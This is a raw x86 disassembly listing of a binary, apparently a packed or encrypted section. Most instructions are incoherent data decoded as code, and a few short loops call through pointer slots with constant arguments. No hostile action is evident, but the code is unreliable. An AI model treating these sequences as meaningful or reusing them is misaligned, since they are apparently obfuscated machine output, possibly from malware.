  412896:	add    al,0xf8
  412898:	fcmovne st,st(0)
  41289a:	or     al,0x37
  41289c:	fisubr DWORD PTR [edi-0x7e]
  41289f:	cmp    edi,DWORD PTR [ebx+0x8113c14]
  4128a5:	cs jno 0x41290b
  4128a8:	pop    ebp
  4128a9:	or     eax,0x82ae47e0
  4128ae:	jp     0x4128d1
  4128b0:	(bad)  
  4128b1:	lea    ebp,[edx+0xa2823de]
  4128b7:	xor    edi,ecx
  4128b9:	inc    edx
  4128ba:	push   0x69af7a13
  4128bf:	cmp    al,0xb1
  4128c1:	retf   
  4128c2:	clc    
  4128c3:	popf   
  4128c4:	icebp  
  4128c5:	int    0x3e
  4128c7:	shr    ch,cl
  4128c9:	js     0x4128f2
  4128cb:	sbb    DWORD PTR [edx+0x47],edi
  4128ce:	js     0x41293d
  4128d0:	push   esi
  4128d1:	pop    eax
  4128d2:	fnsave [ebp+ebx*8+0x51]
  4128d6:	xlat   BYTE PTR ds:[bx]
  4128d8:	push   es
  4128d9:	add    eax,0x5d05d792
  4128de:	shr    cl,cl
  4128e0:	jp     0x4128c8
  4128e2:	and    cl,BYTE PTR [ecx+0x5012f576]
  4128e8:	out    dx,al
  4128e9:	hlt    
  4128ea:	(bad)  
  4128ec:	sbb    BYTE PTR [edx],ah
  4128ee:	sub    al,0xd4
  4128f0:	jb     0x412962
  4128f2:	(bad)  
  4128f4:	xor    eax,0xf1b68c58
  4128f9:	repz cli 
  4128fb:	sub    BYTE PTR [esp],dl
  4128fe:	jno    0x41297e
  412900:	add    eax,0xba158e9c
  412905:	mov    es,WORD PTR ds:[edx]
  412908:	out    dx,eax
  412909:	div    DWORD PTR [edi]
  41290b:	or     edx,DWORD PTR [ecx-0x6d7ceda5]
  412911:	jmp    0x31a2:0xf80f44db
  412918:	add    eax,0xebffa9c7
  41291d:	stos   BYTE PTR es:[edi],al
  41291e:	jns    0x412948
  412920:	or     ebx,eax
  412922:	test   al,0xa7
  412924:	or     eax,DWORD PTR [ebp-0x55]
  412927:	mov    ebp,esi
  412929:	imul   bh
  41292b:	inc    ebx
  41292c:	inc    ebp
  41292d:	cli    
  41292e:	div    BYTE PTR [eax+ebp*2-0x63f23a87]
  412935:	dec    ebp
  412936:	adc    bl,BYTE PTR [ecx]
  412938:	mov    al,ds:0x7580939d
  41293d:	dec    ebp
  41293e:	cmc    
  41293f:	(bad)  
  412940:	out    dx,al
  412941:	dec    esp
  412942:	in     eax,dx
  412943:	scas   al,BYTE PTR es:[edi]
  412944:	test   BYTE PTR [eax-0x18],dl
  412947:	scas   eax,DWORD PTR es:[edi]
  412948:	mov    al,ds:0xb4ed47b3
  41294d:	js     0x412968
  41294f:	aas    
  412950:	pop    eax
  412951:	xchg   ecx,eax
  412952:	mov    ?,ebx
  412954:	popf   
  412955:	or     al,0x38
  412957:	jmp    0x412972
  412959:	adc    bl,BYTE PTR [ecx]
  41295b:	ja     0x412925
  41295d:	fstp   TBYTE PTR [ebx-0x6a]
  412960:	mov    edi,0x398d6417
  412965:	jbe    0x41291b
  412967:	or     eax,0xc08f36d2
  41296c:	fdiv   st(7),st
  41296e:	leave  
  41296f:	outs   dx,BYTE PTR ds:[esi]
  412970:	sub    DWORD PTR [edx+ebp*1-0x46],esi
  412974:	test   eax,0x7fb11d32
  412979:	stos   BYTE PTR es:[edi],al
  41297a:	lock pop es
  41297c:	enter  0xacc8,0xef
  412980:	std    
  412981:	dec    ecx
  412982:	pop    ds
  412983:	in     eax,dx
  412984:	add    esp,edi
  412986:	in     al,0xab
  412988:	dec    ecx
  412989:	push   0xffffffbb
  41298b:	inc    edx
  41298c:	shl    DWORD PTR [ecx+ebp*1-0x1b7cbe54],1
  412993:	lock pop ds
  412995:	ret    
  412996:	sti    
  412997:	popa   
  412998:	loopne 0x412a12
  41299a:	adc    edi,edi
  41299c:	cdq    
  41299d:	in     al,0x52
  41299f:	cdq    
  4129a0:	loope  0x4129cb
  4129a2:	in     eax,0x4d
  4129a4:	inc    edx
  4129a5:	sbb    al,dl
  4129a7:	jg     0x4129a3
  4129a9:	aam    0xaa
  4129ab:	out    0x2d,al
  4129ad:	aam    0x28
  4129af:	rol    DWORD PTR [eax],1
  4129b1:	pop    eax
  4129b2:	xchg   DWORD PTR [edx+0x551f036d],edi
  4129b8:	jno    0x4129dd
  4129ba:	dec    ebp
  4129bb:	jb     0x412a07
  4129bd:	pop    es
  4129be:	rol    DWORD PTR [edx+0x20e93936],cl
  4129c4:	xchg   ecx,eax
  4129c5:	mov    al,ds:0xb5e2be37
  4129ca:	inc    esp
  4129cb:	mov    ch,0x8d
  4129cd:	cld    
  4129ce:	leave  
  4129cf:	push   ebx
  4129d0:	fadd   DWORD PTR [edx-0x4e5f5dec]
  4129d6:	(bad)  
  4129d7:	jo     0x4129b4
  4129d9:	stos   BYTE PTR es:[edi],al
  4129da:	addr16 pop ss
  4129dc:	mov    dh,0xef
  4129de:	repnz sbb al,0x29
  4129e1:	or     ebp,DWORD PTR [bp-0x2f]
  4129e5:	xor    ecx,DWORD PTR [ebp+0x67]
  4129e8:	aas    
  4129e9:	aaa    
  4129ea:	fcom   QWORD PTR [edx]
  4129ec:	stos   BYTE PTR es:[edi],al
  4129ed:	pushf  
  4129ee:	out    0xa5,al
  4129f0:	sub    dh,BYTE PTR ds:0x4a839849
  4129f6:	sub    DWORD PTR [ebp+0x57],edx
  4129f9:	arpl   WORD PTR [edx+0x28],ax
  4129fc:	(bad)  
  4129fd:	mul    dh
  4129ff:	out    0x60,eax
  412a01:	push   ebx
  412a02:	daa    
  412a03:	movntps XMMWORD PTR [ebx-0xabf50a4],xmm1
  412a0a:	mov    al,0xa5
  412a0c:	cmp    BYTE PTR [ecx],cl
  412a0e:	std    
  412a0f:	pusha  
  412a10:	arpl   WORD PTR [edi],ax
  412a12:	xchg   esi,eax
  412a13:	ss clc 
  412a15:	push   esp
  412a16:	test   BYTE PTR [edx],bl
  412a18:	sbb    BYTE PTR [ebx+0x62238cb9],bl
  412a1e:	push   esp
  412a1f:	lea    esi,[eax]
  412a21:	icebp  
  412a22:	inc    BYTE PTR [ebx-0x10]
  412a25:	pop    ebx
  412a26:	dec    esi
  412a27:	(bad)  
  412a28:	pop    edx
  412a29:	es repnz pop ebx
  412a2c:	in     al,dx
  412a2d:	(bad)  
  412a2e:	call   0x2be68900
  412a33:	sahf   
  412a34:	gs xchg esi,eax
  412a36:	and    edx,esi
  412a38:	jge    0x412a66
  412a3a:	pop    ecx
  412a3b:	jl     0x412aa6
  412a3d:	jge    0x4129e0
  412a3f:	push   edx
  412a40:	out    0xc0,al
  412a42:	aad    0x98
  412a44:	loopne 0x412a86
  412a46:	fcmove st,st(4)
  412a48:	xchg   edx,eax
  412a49:	imul   DWORD PTR [edi+esi*4]
  412a4c:	xchg   ecx,eax
  412a4d:	xchg   esp,eax
  412a4e:	cmp    esp,esi
  412a50:	mov    bl,0xa
  412a52:	dec    ebx
  412a53:	das    
  412a54:	cdq    
  412a55:	or     BYTE PTR [eax+ecx*4-0x75],al
  412a59:	cmp    ch,BYTE PTR [ebp+0x22c9b81d]
  412a5f:	jo     0x412a8e
  412a61:	fild   QWORD PTR [edx+0x67abdd79]
  412a67:	cmp    eax,0x36a211d
  412a6c:	addr16 dec edx
  412a6e:	lea    esi,[edx+0x73]
  412a71:	stc    
  412a72:	loope  0x412aad
  412a74:	mov    ebx,0xed5633c7
  412a79:	fiadd  WORD PTR [ebx-0x66]
  412a7c:	fsubr  QWORD PTR [eax+edi*4+0x3b]
  412a80:	or     eax,0x8357ab05
  412a85:	xchg   ebp,eax
  412a86:	mov    dh,0x63
  412a88:	pop    ebp
  412a89:	lds    ebp,FWORD PTR [edx]
  412a8b:	je     0x412a21
  412a8d:	sub    ecx,DWORD PTR [edi+0x10840f89]
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    cl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fcf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fcf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b5a
  412b3b:	cld    
  412b3c:	je     0x412b8e
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b23
  412b47:	scas   ax,WORD PTR es:[edi]
  412b49:	jle    0x412b34
  412b4b:	inc    esi
  412b4c:	jmp    0x412b1b
  412b4e:	aaa    
  412b4f:	(bad)  [ebx+0x41c1448]
  412b55:	ss pop esi
  412b57:	call   0x9422a102
  412b5c:	inc    ecx
  412b5d:	jmp    0x1103:0xaa5ef0d9
  412b64:	fisttp DWORD PTR [ebp+0x76]
  412b67:	sub    bl,BYTE PTR [ebx-0x3f335fbf]
  412b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6e:	in     al,dx
  412b6f:	outs   dx,DWORD PTR ds:[esi]
  412b70:	call   0x888d:0x380c8b55
  412b77:	mov    dh,BYTE PTR [ecx]
  412b79:	pop    ss
  412b7a:	mov    ds:0xd3a79421,eax
  412b7f:	mov    fs,WORD PTR [eax+0x2f]
  412b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b83:	fs jb  0x412b66
  412b86:	stos   DWORD PTR es:[edi],eax
  412b87:	jle    0x412bc0
  412b89:	pop    ds
  412b8a:	lock daa 
  412b8c:	jne    0x412b31
  412b8e:	(bad)
  412b91:	enter  0x7da,0x6b
  412b95:	mov    bl,0xcd
  412b97:	repz push ss
  412b99:	rol    DWORD PTR [edx],1
  412b9b:	(bad)  [ebp+0x71]
  412b9e:	mov    ecx,0xf3aa7e9e
  412ba3:	jae    0x412b45
  412ba5:	inc    cx
  412ba7:	mov    ah,0x5d
  412ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412baa:	lea    esi,[edx-0x42]
  412bad:	mov    bl,0x92
  412baf:	into   
  412bb0:	sbb    BYTE PTR [edi-0x66],dl
  412bb3:	sbb    al,0x8b
  412bb5:	sub    DWORD PTR [edx],0x56cdffc6
  412bbb:	js     0x412b98
  412bbd:	dec    eax
  412bbe:	mov    WORD PTR [ecx],?
  412bc0:	in     al,dx
  412bc1:	popf   
  412bc2:	test   eax,0xa94c878e
  412bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc9:	test   BYTE PTR [ebx+0x8],bl
  412bcc:	and    dh,dl
  412bce:	adc    ebp,DWORD PTR [edi]
  412bd0:	fwait
  412bd1:	mov    bl,0xa1
  412bd3:	rcr    DWORD PTR [edx-0x605a8943],0xa8
  412bda:	(bad)  
  412bdc:	mov    dl,0xb3
  412bde:	mov    ds:0x8da54ce0,al
  412be3:	xchg   BYTE PTR [ecx+ecx*4-0x413318d8],dh
  412bea:	jae    0x412bad
  412bec:	sbb    edi,DWORD PTR ds:0xac31a363
  412bf2:	(bad)  
  412bf4:	pop    ebp
  412bf5:	rol    BYTE PTR [edi+0x4cf4bd52],1
  412bfb:	mov    edi,0x5a7fcc7e
  412c00:	or     edx,DWORD PTR fs:[ebx-0x7ff05f99]
  412c07:	mov    ebp,DWORD PTR [esi-0x1e]
  412c0a:	push   ss
  412c0b:	inc    edx
  412c0c:	add    bh,BYTE PTR [ebx-0x41]
  412c0f:	scas   eax,DWORD PTR es:[edi]
  412c10:	jne    0x412c56
  412c12:	mov    ch,0x59
  412c14:	ret    
  412c15:	(bad)  
  412c16:	jge    0x412c92
  412c18:	rol    BYTE PTR fs:[ebp-0x1a],1
  412c1c:	xchg   ebp,eax
  412c1d:	sbb    eax,0x71b210e
  412c22:	ins    BYTE PTR es:[edi],dx
  412c23:	xor    al,0x13
  412c25:	xor    BYTE PTR [edi+0x25],bl
  412c28:	gs in  eax,0xb6
  412c2b:	xchg   esp,eax
  412c2c:	test   eax,0x71bd563c
  412c31:	sbb    bh,BYTE PTR [ecx+0x74]
  412c34:	fst    QWORD PTR [edi]
  412c36:	ror    DWORD PTR ds:0xfb35767b,1
  412c3c:	shl    DWORD PTR [ebp-0x12],1
  412c3f:	inc    ebp
  412c40:	or     al,BYTE PTR [esi-0x1f]
  412c43:	dec    esp
  412c44:	sub    ecx,DWORD PTR [ecx+0x2e6bcb45]
  412c4a:	lods   al,BYTE PTR ds:[esi]
  412c4b:	outs   dx,BYTE PTR ds:[esi]
  412c4c:	das    
  412c4d:	adc    al,0xa3
  412c4f:	imul   ecx,DWORD PTR [edi-0x633c3559],0x60
  412c56:	ja     0x412c00
  412c58:	js     0x412bf4
  412c5a:	sbb    al,0x86
  412c5c:	arpl   WORD PTR [edi],si
  412c5e:	and    BYTE PTR [ebx+0x71da0fc5],bh
  412c64:	cmp    eax,0xce36e946
  412c69:	cs cmc 
  412c6b:	ds hlt 
  412c6d:	sahf   
  412c6e:	add    bh,0xc9
  412c71:	mov    ah,BYTE PTR [edx-0x8]
  412c74:	adc    ch,dl
  412c76:	fadd   DWORD PTR [eax]
  412c78:	das    
  412c79:	sub    esp,DWORD PTR [esi-0x2262ec39]
  412c7f:	mov    eax,ds:0xcd613295
  412c84:	in     al,dx
  412c85:	jl     0x412ccd
  412c87:	mov    bl,0xdc
  412c89:	(bad)  
  412c8a:	xchg   esi,eax
  412c8b:	push   es
  412c8c:	jns    0x412c24
  412c8e:	jl     0x412c79
  412c90:	xor    al,0x49
  412c92:	fcom   QWORD PTR [esi]
  412c94:	xor    eax,0x38d06f55
  412c99:	cmp    BYTE PTR [edi-0x5c],dl
  412c9c:	and    DWORD PTR [ecx+0x28],0x8aa23d0e
  412ca3:	add    al,0xbd
  412ca5:	mov    bl,dl
  412ca7:	ret    
  412ca8:	adc    ebp,ebx
  412caa:	cdq    
  412cab:	mov    al,ds:0x3e2b3a60
  412cb0:	stc    
  412cb1:	dec    esi
  412cb2:	pop    ds
  412cb3:	ins    BYTE PTR es:[edi],dx
  412cb4:	ins    DWORD PTR es:[edi],dx
  412cb5:	jnp    0x412c4a
  412cb7:	(bad)
  412cba:	out    0x21,al
  412cbc:	icebp  
  412cbd:	cmp    al,BYTE PTR [esp+edi*8-0xa]
  412cc1:	scas   al,BYTE PTR es:[edi]
  412cc2:	out    dx,al
  412cc3:	jmp    0xba63:0x3dea55d8
  412cca:	dec    ebp
  412ccc:	xchg   edx,eax
  412ccd:	fisttp WORD PTR [esi]
  412ccf:	test   eax,0x4c44ce46
  412cd4:	mov    dl,0x23
  412cd6:	aad    0xd1
  412cd8:	inc    ebx
  412cd9:	add    DWORD PTR [ebp+0x28bccffb],ebx
  412cdf:	in     al,0xfa
  412ce1:	iret   
  412ce2:	js     0x412c8b
  412ce4:	jge    0x412cf4
  412ce6:	xchg   edi,eax
  412ce7:	js     0x412cee
  412ce9:	jge    0x412d17
  412ceb:	adc    eax,0x4acad0d2
  412cf0:	push   0xffffffb8
  412cf2:	out    0xf5,al
  412cf4:	scas   eax,DWORD PTR es:[edi]
  412cf5:	pshufw mm2,mm7,0xc6
  412cf9:	jo     0x412ca3
  412cfb:	pop    ds
  412cfc:	sub    BYTE PTR [edi-0x5a827966],0x51
  412d03:	cli    
  412d04:	jge    0x412cba
  412d06:	mov    cl,BYTE PTR [ebx+esi*8+0x54]
  412d0a:	inc    ecx
  412d0b:	xchg   DWORD PTR [edi],esp
  412d0d:	stos   BYTE PTR es:[edi],al
  412d0e:	xor    ch,BYTE PTR gs:[esi+0x3e913414]
  412d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d16:	dec    edi
  412d17:	add    ecx,ebx
  412d19:	xor    DWORD PTR [edx-0x784d856e],esp
  412d1f:	cld    
  412d20:	js     0x412d9e
  412d22:	lock or bh,al
  412d25:	sbb    cl,BYTE PTR ds:0x2354a3af
  412d2b:	ss sti 
  412d2d:	jge    0x412cb2
  412d2f:	adc    al,BYTE PTR [ebx-0x1a19ea2f]
  412d35:	imul   ecx,DWORD PTR [eax+0x50d69161],0xffffff87
  412d3c:	pop    ds
  412d3d:	xchg   ebp,eax
  412d3e:	and    al,0xfc
  412d40:	fld    TBYTE PTR [ebx+eax*4]
  412d43:	fist   DWORD PTR [edx-0x460551d5]
  412d49:	cmp    cl,ah
  412d4b:	sub    dl,al
  412d4d:	in     eax,0x8e
  412d4f:	xchg   esp,eax
  412d50:	daa    
  412d51:	cdq    
  412d52:	imul   eax,DWORD PTR [edi-0x354ff16a],0x5eb351c
  412d5c:	fstp   QWORD PTR [ecx]
  412d5e:	add    edi,DWORD PTR [eax+0x27]
  412d61:	jns    0x412cfa
  412d63:	xchg   ecx,eax
  412d64:	dec    esp
  412d65:	mov    ebp,0xdb9aa173
  412d6a:	imul   edi,DWORD PTR [ebx+0x5e],0xbb18eef5
  412d71:	cs (bad) 
  412d73:	push   eax
  412d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d75:	(bad)  
  412d77:	cmc    
  412d78:	aas    
  412d79:	add    DWORD PTR [ecx+0x7f982a5c],eax
  412d7f:	nop
  412d80:	jbe    0x412d49
  412d82:	inc    ebx
  412d83:	rcl    esi,0xf5
  412d86:	(bad)  
  412d87:	mov    ss,WORD PTR [ebp-0x22]
  412d8a:	lods   eax,DWORD PTR ds:[esi]
  412d8c:	cmp    al,0x52
  412d8e:	sti    
  412d8f:	push   edx
  412d90:	call   0x94d6:0x13995f1e
  412d97:	out    dx,al
  412d98:	into   
  412d99:	mov    al,0x47
  412d9b:	and    BYTE PTR [eax-0x4],dl
  412d9e:	aas    
  412d9f:	and    DWORD PTR [ebx],edi
  412da1:	in     al,0xd1
  412da3:	pop    ebx
  412da4:	pushf  
  412da5:	mov    ah,0xf
  412da7:	addr16 pop ebx
  412da9:	add    al,0x1b
  412dab:	stos   DWORD PTR es:[edi],eax
  412dac:	sahf   
  412dad:	test   BYTE PTR [ecx-0x28e1d05e],dl
  412db3:	sbb    al,0x2c
  412db5:	int    0xbc
  412db7:	cmp    eax,0x4a160831
  412dbc:	dec    edi
  412dbd:	inc    ecx
  412dbe:	adc    esi,eax
  412dc0:	pop    ebp
  412dc1:	ds sub al,0x5b
  412dc4:	push   0x17
  412dc6:	inc    eax
  412dc7:	sahf   
  412dc8:	cmp    eax,0x32735cf3
  412dcd:	push   ebx
  412dce:	test   eax,0xbff66537
  412dd3:	xor    al,0x48
  412dd5:	mov    ebp,DWORD PTR [ebp-0x19a26d06]
  412ddb:	mov    WORD PTR [ecx+0x34],gs
  412dde:	xchg   ecx,eax
  412ddf:	fdiv   QWORD PTR [esi-0x23ee3a71]
  412de5:	leave  
  412de6:	mov    bh,0xd0
  412de8:	sbb    dl,dh
  412dea:	lods   eax,DWORD PTR ds:[esi]
  412deb:	(bad)  
  412dec:	js     0x412e23
  412dee:	mov    cl,0x5e
  412df0:	cs sbb eax,0x82b3f100
  412df6:	mov    bl,0x56
  412df8:	push   cs
  412df9:	stc    
  412dfa:	mov    ds:0x42f28e07,al
  412dff:	out    0x18,eax
  412e01:	cmp    DWORD PTR [eax],0x30a089d3
  412e07:	es out dx,al
  412e09:	ins    BYTE PTR es:[edi],dx
  412e0a:	popa   
  412e0b:	in     al,0x67
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebp+0x5a378df6],di
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0xc070707e
  412e82:	out    dx,eax
  412e83:	and    DWORD PTR [edx+0x39],esp
  412e86:	jl     0x412ea8
  412e88:	cmp    al,0xc7
  412e8a:	xchg   ebp,eax
  412e8b:	inc    ebx
  412e8c:	scas   al,BYTE PTR es:[edi]
  412e8d:	ret    0x49a3
  412e90:	sub    DWORD PTR [edx],esp
  412e92:	ss or  eax,0x253d94bc
  412e98:	ret    
  412e99:	xchg   esp,eax
  412e9a:	ds and al,0x94
  412e9d:	mov    dl,0xa7
  412e9f:	xor    eax,0x99872a09
  412ea4:	dec    ebx
  412ea5:	push   eax
  412ea6:	aaa    
  412ea7:	xor    eax,edx
  412ea9:	add    DWORD PTR [esi],esi
  412eab:	call   0xab0e:0x3e86ee48
  412eb2:	add    eax,0xe09572d4
  412eb7:	push   es
  412eb8:	push   0xffffffe6
  412eba:	pop    eax
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	les    esp,FWORD PTR [ecx+esi*1-0x31078c9]
  412ec3:	push   0xfffffffd
  412ec5:	push   ebx
  412ec6:	dec    edi
  412ec7:	aaa    
  412ec8:	adc    esp,DWORD PTR [edi-0x5cf7f961]
  412ece:	mov    cl,dl
  412ed0:	push   esp
  412ed1:	cwde   
  412ed2:	int    0x3c
  412ed4:	fnstcw WORD PTR [ebp-0x1d29b3e3]
  412eda:	push   0xffffffda
  412edc:	pop    esp
  412edd:	mov    ebp,0x67a84abc
  412ee2:	xor    al,0x48
  412ee4:	mov    cl,0xd9
  412ee6:	dec    edi
  412ee7:	mov    ah,0x84
  412ee9:	adc    eax,0x1b4174e2
  412eee:	xor    al,0x2
  412ef0:	and    al,0x2e
  412ef2:	xlat   BYTE PTR ds:[ebx]
  412ef3:	mov    ebx,0xecceb009
  412ef8:	adc    BYTE PTR [eax],bh
  412efa:	aas    
  412efb:	outs   dx,BYTE PTR ds:[esi]
  412efc:	aam    0x74
  412efe:	xor    dh,BYTE PTR [eax+0x5cc86153]
  412f04:	inc    edi
  412f05:	mov    cl,0xb9
  412f07:	or     al,0xc5
  412f09:	mov    esp,DWORD PTR [esi]
  412f0b:	cmp    dl,bl
  412f0d:	push   esi
  412f0e:	adc    bh,bh
  412f10:	xchg   edx,eax
  412f11:	jl     0x412f28
  412f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f15:	and    al,0x61
  412f17:	sahf   
  412f18:	xor    BYTE PTR [edi+ebp*8+0x63],0x9b
  412f1d:	adc    esi,ebp
  412f1f:	(bad)  
  412f20:	loope  0x412f8a
  412f22:	dec    edx
  412f23:	mov    eax,ds:0xdf2a6c6
  412f28:	pop    es
  412f29:	adc    BYTE PTR [esi],bl
  412f2b:	mov    edx,0x6ff086fc
  412f30:	dec    eax
  412f31:	pop    si
  412f33:	aam    0x17
  412f35:	(bad)  
  412f36:	push   eax
  412f37:	stos   BYTE PTR es:[edi],al
  412f38:	mov    BYTE PTR [ecx],dh
  412f3a:	dec    ecx
  412f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f3c:	sbb    al,0x70
  412f3e:	aas    
  412f3f:	les    eax,FWORD PTR [ebx+edi*2+0x46b52edb]
  412f46:	sbb    al,0x4
  412f48:	or     cl,BYTE PTR [ecx*8+0x1dc3ee9a]
  412f4f:	add    eax,0x4cb255f4
  412f54:	lahf   
  412f55:	arpl   bx,dx
  412f57:	mov    ?,ebp
  412f59:	push   esp
  412f5a:	retf   
  412f5b:	(bad)  
  412f5c:	dec    ebx
  412f5d:	cdq    
  412f5e:	ss stc 
  412f60:	in     al,dx
  412f61:	leave  
  412f62:	ficomp WORD PTR [esi+0x4a3e4fe3]
  412f68:	pop    eax
  412f69:	in     eax,0xb5
  412f6b:	loopne 0x412f7d
  412f6d:	lahf   
  412f6e:	and    ebp,0xffffff8b
  412f71:	leave  
  412f72:	rcl    DWORD PTR [esp+eiz*2],1
  412f75:	xchg   ecx,eax
  412f76:	clc    
  412f77:	pop    es
  412f78:	push   ds
  412f79:	push   cs
  412f7a:	jle    0x412f7e
  412f7c:	xor    eax,0xedf16b4c
  412f81:	ja     0x412f72
  412f83:	ins    DWORD PTR es:[edi],dx
  412f84:	xchg   ebx,eax
  412f85:	retf   0x7ab9
  412f88:	das    
  412f89:	retf   0xfda6
  412f8c:	js     0x412fcc
  412f8e:	pop    esi
  412f8f:	push   edx
  412f90:	ret    0xeb27
  412f93:	adc    al,0x2
  412f95:	out    0x29,al
  412f97:	fmul   QWORD PTR [edx+0x58]
  412f9a:	sbb    DWORD PTR [ebx+0x1e],ebx
  412f9d:	mov    cl,0xa7
  412f9f:	(bad)  
  412fa0:	adc    dh,ah
  412fa2:	xor    edx,DWORD PTR [ebx-0x5f]
  412fa5:	add    edx,DWORD PTR [ebp+0x1d]
  412fa8:	or     dh,cl
  412faa:	js     0x412f96
  412fac:	inc    esp
  412fad:	push   esp
  412fae:	fadd   st(7),st
  412fb0:	pop    ss
  412fb1:	int    0x4
  412fb3:	and    esi,DWORD PTR [esi+0x72]
  412fb6:	jge    0x412f38
  412fb8:	vpsraw ymm2,ymm1,0xbd
  412fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fbe:	sub    BYTE PTR [eax],ah
  412fc0:	bound  ebx,QWORD PTR [eax-0x2a84a0e4]
  412fc6:	fsubr  st(4),st
  412fc8:	ficomp DWORD PTR [ebp+0x29f5f81f]
  412fce:	adc    BYTE PTR [edx-0x755d531d],dl
  412fd4:	pop    ds
  412fd5:	push   edx
  412fd6:	sbb    bh,BYTE PTR [ecx]
  412fd8:	(bad)
  412fdb:	scas   eax,DWORD PTR es:[edi]
  412fdc:	mov    ebp,0x6f1eb61b
  412fe1:	mov    dh,0xd6
  412fe3:	xor    al,0xa6
  412fe5:	mov    dh,cl
  412fe7:	mov    BYTE PTR [edx+ebp*1-0x66d34999],ah
  412fee:	or     bh,BYTE PTR [edx+esi*4+0x3e6be14c]
  412ff5:	test   BYTE PTR [ecx-0x6f],0x78
  412ff9:	(bad)
  412ffd:	inc    edx
  412ffe:	jge    0x412fc0
  413000:	nop
  413001:	xor    DWORD PTR [esi],edi
  413003:	pop    ecx
  413004:	xlat   BYTE PTR ds:[ebx]
  413005:	test   DWORD PTR ds:[ebx],ecx
  413008:	adc    dh,BYTE PTR [esi+0x27]
  41300b:	fist   DWORD PTR [ebx-0x6d3d5724]
  413011:	fidivr WORD PTR [eax]
  413013:	ret    
  413014:	sub    esi,esi
  413016:	sub    ch,BYTE PTR [edi-0x2155c9f8]
  41301c:	aaa    
  41301d:	pop    esp
  41301e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41301f:	enter  0x14be,0x11
  413023:	std    
  413024:	xchg   ebp,eax
  413025:	xchg   edx,eax
  413026:	push   ecx
  413027:	sahf   
  413028:	loop   0x412ffa
  41302a:	retf   0xd25b
  41302d:	cmp    al,0x70
  41302f:	push   edx
  413030:	xchg   esp,eax
  413031:	imul   BYTE PTR [eax+0x69]
  413034:	mov    DWORD PTR [ebx+0x708d4df0],esi
  41303a:	adc    cl,dh
  41303c:	mov    esp,ecx
  41303e:	cmp    al,0x3e
  413040:	je     0x4130b5
  413042:	(bad)  [ecx]
  413044:	dec    ecx
  413045:	mov    bl,0x2a
  413047:	lds    ebp,FWORD PTR [edi-0x35]
  41304a:	add    BYTE PTR ds:0x355b495,ch
  413050:	sub    BYTE PTR [eax+0x4450477f],ch
  413056:	fisubr DWORD PTR [edi]
  413058:	in     eax,0x11
  41305a:	push   esi
  41305b:	fcmove st,st(1)
  41305d:	(bad)  [edi]
  41305f:	je     0x41301d
  413061:	scas   eax,DWORD PTR es:[edi]
  413062:	pop    edx
  413063:	dec    edi
  413064:	jnp    0x4130d4
  413066:	ins    BYTE PTR es:[edi],dx
  413067:	daa    
  413068:	rcr    DWORD PTR [edi],0x84
  41306b:	test   al,0xdc
  41306d:	cmp    al,BYTE PTR [edi]
  41306f:	in     eax,dx
  413070:	test   DWORD PTR [edi-0x52],0x679261e7
  413077:	sub    al,0x19
  413079:	adc    eax,DWORD PTR [esi+0x75]
  41307c:	shr    ch,cl
